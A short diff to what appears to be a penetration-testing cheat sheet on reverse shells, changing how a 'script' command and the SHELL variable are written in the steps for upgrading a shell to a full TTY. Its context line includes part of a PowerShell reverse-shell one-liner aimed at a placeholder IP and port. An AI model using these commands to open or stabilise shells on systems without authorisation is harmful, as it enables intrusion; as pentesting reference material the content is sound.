@@ -83,7 +83,7 @@ echo '$client = New-Object System.Net.Sockets.TCPClient("<ip>",<port>);$stream =
 {% tabs %}
 {% tab title="Script" %}
 ```bash
-script /dev/null -qc /bin/bash
+script -qc bash /dev/null
 ```
 {% endtab %}
 
@@ -101,7 +101,7 @@ and then run:
 stty raw -echo; fg
 reset xterm
 export TERM=xterm
-export SHELL=bash
+export SHELL=/bin/bash
 stty rows <rows> columns <cols>  # Check size in another window -> stty size
 ```
 
